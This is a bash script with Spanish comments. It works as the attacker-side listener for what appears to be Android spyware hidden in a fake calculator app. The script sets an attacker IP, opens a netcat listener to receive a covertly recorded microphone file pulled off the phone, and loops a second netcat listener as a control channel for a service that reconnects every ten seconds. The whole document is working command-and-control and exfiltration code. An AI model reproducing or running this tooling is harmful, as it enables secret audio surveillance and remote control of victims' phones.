#!/bin/bash

# --- Configuración de Red ---
LHOST_ATACANTE="192.168.0.108"
PUERTO_CONTROL="4444"
PUERTO_RECEPTOR="5555"
# El path del archivo en Android después de usar STOP_MIC:
RUTA_ANDROID="/storage/emulated/0/Android/data/com.sourav.mohanty.calculator/files/Music/audio_capture.mp4"
# -----------------------------

ARCHIVO_RECIBIDO="audio_$(date +%Y%m%d_%H%M%S).mp4"
PID_RECEPTOR=

# Función para limpiar y cerrar todos los procesos en segundo plano
cleanup() {
    echo -e "\n\n[INFO] Deteniendo listeners y limpiando..."
    # Cierra el listener receptor (si aún está activo)
    if [ ! -z "$PID_RECEPTOR" ]; then
        kill "$PID_RECEPTOR" 2>/dev/null
    fi
    echo "[INFO] Scripts cerrados. Archivo guardado como: $ARCHIVO_RECIBIDO"
}

# Configura la función cleanup para que se ejecute al salir (Ctrl+C)
trap cleanup EXIT

echo "========================================================="
echo "      SCRIPT MULTI-SESIÓN DE CONTROL Y EXFILTRACIÓN"
echo "========================================================="

# 1. Inicia el Listener Receptor (puerto 5555) en segundo plano
echo -e "[INFO] Iniciando listener RECEPTOR en el puerto \033[1;32m${PUERTO_RECEPTOR}\033[0m..."
nc -lvp "$PUERTO_RECEPTOR" > "$ARCHIVO_RECIBIDO" & PID_RECEPTOR=$!
sleep 1

# 2. Bucle para asegurar el listener de CONTROL (4444) y devolver el prompt
while true; do
    echo -e "\n[INFO] Esperando conexión de CONTROL en el puerto \033[1;36m${PUERTO_CONTROL}\033[0m..."
    
    # El comando 'timeout' hace que Netcat se cierre si está inactivo por un tiempo, 
    # pero aquí forzamos que se ejecute solo una vez para capturar la conexión.
    # Usamos 'nc -k' para que no se cierre después de la primera conexión.
    
    # Inicia Netcat en primer plano, pero permitiendo la interacción.
    nc -lvp "$PUERTO_CONTROL" 
    
    # En el momento en que DogoService se conecta, el comando nc termina/se cuelga.
    # Pero el DogoService se reconecta cada 10 segundos, así que esperamos un momento
    # y reiniciamos el listener inmediatamente.
    sleep 2 
done

# La función cleanup() se ejecuta automáticamente al salir (Ctrl+C).
